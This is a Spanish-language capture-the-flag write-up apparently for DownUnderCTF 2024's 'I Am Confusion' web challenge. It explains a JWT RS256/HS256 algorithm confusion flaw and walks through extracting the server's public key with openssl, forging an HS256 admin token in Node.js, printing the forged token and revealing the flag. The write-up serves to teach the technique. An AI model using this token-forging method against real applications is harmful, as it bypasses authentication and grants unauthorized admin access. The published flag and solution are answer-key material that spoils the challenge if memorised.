I Am Confusion
===========
---

- CTF URL -> [IAMCONFUSION](https://play.duc.tf/challenges#i%20am%20confusion-4)

---
Enunciado

```
The evil hex bug has taken over our administrative interface of our application. It seems that the secret we used to protect our authentication was very easy to guess. We need to get it back!
```
---

### Recursos

- [Código del servidor](./recurso/server.js)
- [Package json](./recurso/package.json)
- https://i-am-confusion.2024.ductf.dev:30001/ (Server para vulnerar)
---

### Solución

Al mirar dentro del código del servidor, observamos que el algoritmo de firmado es 'RS256' pero los algoritmos de verificación son 2: RS256 & HS256.
RS256 es un algoritmo de cifrado asimétrico, mientras que HS256 es simétrico Ver https://auth0.com/blog/rs256-vs-hs256-whats-the-difference/.

```javascript
// algs
const verifyAlg = { algorithms: ['HS256','RS256'] }
const signAlg = { algorithm:'RS256' }
```

Sabemos que para algoritmos asimétricos se utiliza la llave pública para verificar la firma, y para algoritmos simétricos se utiliza la misma llave tanto para firmar como para verificar.
Con lo cual, podríamos intentar crear un token a partir de la llave pública.

### Conseguir la llave pública

Conseguir la llave pública de un sitio es tanto igual de sencillo como descargarla del browser mismo, pero para ponerle un poco mas de cariño podemos obtenerla con el siguiente comando

```shell
openssl s_client -connect i-am-confusion.2024.ductf.dev:30001 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > recurso/i-am-confusion.2024.ductf.dev.pem
```

y el certificado 
```text
 -----BEGIN CERTIFICATE-----
MIIFCjCCA/KgAwIBAgISAy/oVvF2ILJQ+davzA0SCwxIMA0GCSqGSIb3DQEBCwUA
MDMxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBFbmNyeXB0MQwwCgYDVQQD
EwNSMTEwHhcNMjQwNzA1MDUxMzA5WhcNMjQxMDAzMDUxMzA4WjAoMSYwJAYDVQQD
Ex1pLWFtLWNvbmZ1c2lvbi4yMDI0LmR1Y3RmLmRldjCCASIwDQYJKoZIhvcNAQEB
BQADggEPADCCAQoCggEBAK48mzTUt0k/FX1KACIb5WSbTbPbYNCtvmwKcjbXFrxg
/20RCZyNapXNCTqBfGfMzhEoKSaK4Eh7Dx+r/oYDntwSDYTrYa4hG2poexlRiPXE
BkhQx53A4rmgBXJjGLfjhohtsCMyifZ4a+kMQOZNygEP+cQDDFCvKADi1BtSUGM3
wpLRqXIkh8vdNdo5obM1F6CeTEKQZ8hVQ+mGt2DP9aVllklTMYJR7+ldLxwI/O/P
jhS2AVqeZXVswLRf9H+1wylNCaoeHxEn7z0CeQfxw5PFjM4VjRGMbO5WQLyaptIX
LQ4AUvYtVo/fObfi2s7p6qxy0LCLtMj6Ep91hWCPvWMCAwEAAaOCAiEwggIdMA4G
A1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwDAYD
VR0TAQH/BAIwADAdBgNVHQ4EFgQUHiyVbv316Wa+JmatVOMj6DYB2EUwHwYDVR0j
BBgwFoAUxc9GpOr0w8B6bJXELbBeki8m47kwVwYIKwYBBQUHAQEESzBJMCIGCCsG
AQUFBzABhhZodHRwOi8vcjExLm8ubGVuY3Iub3JnMCMGCCsGAQUFBzAChhdodHRw
Oi8vcjExLmkubGVuY3Iub3JnLzAoBgNVHREEITAfgh1pLWFtLWNvbmZ1c2lvbi4y
MDI0LmR1Y3RmLmRldjATBgNVHSAEDDAKMAgGBmeBDAECATCCAQQGCisGAQQB1nkC
BAIEgfUEgfIA8AB2AEiw42vapkc0D+VqAvqdMOscUgHLVt0sgdm7v6s52IRzAAAB
kIGGb4oAAAQDAEcwRQIgJIUlmGqi5kVGPUD/nTpvOhZaIkSFkTWbxTKm76fFhCAC
IQDjh9oo8r21ZVGRO4IPmNL92yI/uwJV7DpDoQBAnzPoOAB2AD8XS0/XIkdYlB1l
HIS+DRLtkDd/H4Vq68G/KIXs+GRuAAABkIGGb5IAAAQDAEcwRQIhAP2GMxJ9/VeF
6IwYi5iXtw4IovOTylWu/LfG1LJfwUvuAiBCJ+8jTc2xff4XQxp80Jjx7MDD7gce
x90WUdhkAJWx4zANBgkqhkiG9w0BAQsFAAOCAQEATqlWdLnn2G660LUYAx7u+zwn
esdn4sN17k8fhABB7CA3rn5bMBaSNY7xzJ9dJynnn8UaZ9itRbRoNJRkOeGEs6cE
QOSvG/dbCn8enFvR+bhqsB0Axu7m/oIcbPUAfB47Z13R0rlrq/bBUMVeYhOOjDZ/
kxafzN1p3A0/F7vUf1YVkJTHixuvJbcCMLCvyd7bTHDULzDCxBAsKN5HnL7g/Wdy
sOtRck3cJYgYvzkq5HAI2U+107LqxcpEede9aJJhaPFeHqjMkiQZqdIHKavfopZj
dpI7SOQPmwZhjqRYp46/qiWrrXxWhQ9q3rIeUlzxF0PpOhJIhhgjv7N5nOdxTg==
-----END CERTIFICATE-----
 ```

Si volvemos a mirar con mayor detalle en el código del servidor, vemos un get al /admin

```javascript
app.get('/admin.html', (req, res) => {
    var cookie = req.cookies;
    jwt.verify(cookie['auth'], publicKey, verifyAlg, (err, decoded_jwt) => {
        if (err) {
            res.status(403).send("403 -.-");
        } else if (decoded_jwt['user'] == 'admin') {
            res.sendFile(path.join(__dirname, 'admin.html')) // flag!
        } else {
            res.status(403).sendFile(path.join(__dirname, '/public/hehe.html'))
        }
    })
})
```
y en base a esto sabemos que el contenido del token a generar tiene que 
- tener user=admin
- una cookie auth=token

El token entonces podemos generarlo como describimos a continuación

```javascript
const pem = fs.readFileSync('recurso/i-am-confusion.2024.ductf.dev.pem');
const publicKey = crypto.createPublicKey({
    key: pem,
    format: 'pem',
}).export({
    format: 'pem',
    type: 'pkcs1',
});

const token = jwt.sign({ user: 'admin' }, publicKey, { algorithm: 'HS256' });
console.log(token);
```
y el token JWT
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE3MjIyMTgzNjV9.R0_trHQbCvnoLfww5oW_dzvew17eQbF1DLudpVdsmII
```

Por último, ingresando a la página con el token generado, logramos entrar al /admin y obtener el flag!

`DUCTF{c0nfus!ng_0nE_bUG_@t_a_tIme}`

Para mayor detalle del código de solución, ver [Solución](solve.js)